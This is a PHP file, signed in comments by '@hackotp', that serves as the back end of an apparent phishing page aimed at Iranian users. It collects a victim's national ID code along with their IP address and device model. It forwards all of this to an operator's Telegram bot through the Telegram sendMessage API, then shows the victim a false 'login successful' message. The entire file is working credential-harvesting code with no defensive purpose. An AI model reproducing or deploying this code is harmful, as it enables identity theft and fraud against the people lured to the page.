<?php

/*                                               

Owner ⊷ @hackotp
Channel ⊷ @hackotp

*/

function GetIp()
{
    $ip = $_SERVER['REMOTE_ADDR'];
    return $ip;
}
$browser = $_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
$ip = $_SERVER["HTTP_CLIENT_IP"];
} else {
if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
} else {
$ip = $_SERVER["REMOTE_ADDR"];
}
}
    $devices = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT']) [4], ')');
    $devices2 = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT']) [3], ')');

$ip = GetIp();

$meliApp = $_POST['meliApp'];
if ($meliApp == null) {
echo json_encode(array('status' => '0', 'message' => 'کد ملی خود را وارد کنید'));
} else {

$id = "-100";     // chatId Admin
$token = '6';  // robot Token
$des = "  
NeW TaR 💸 ابلاغ

╠🌠Cᴍᴇʟɪ ➣  <code>$meliApp</code>

IP 🔥 : <code>$ip</code>
Mᴏᴅᴇʟ ⚙️ : <code>$devices $devices2</code> 
";
  $send = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($des) . '&parse_mode=HTML';
    $params = [
'chat_id' => $id,
'text' => $des,
'parse_mode' => 'HTML'
];
    $website = "https://api.telegram.org/bot" . $token;
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
      echo json_encode(array('status' => '1', 'message' => 'ورود موفقیت آمیز بود'));
}

/*                                               

Owner ⊷ @hackotp⊰  
Channel ⊷ @hacckotp⊰   

*/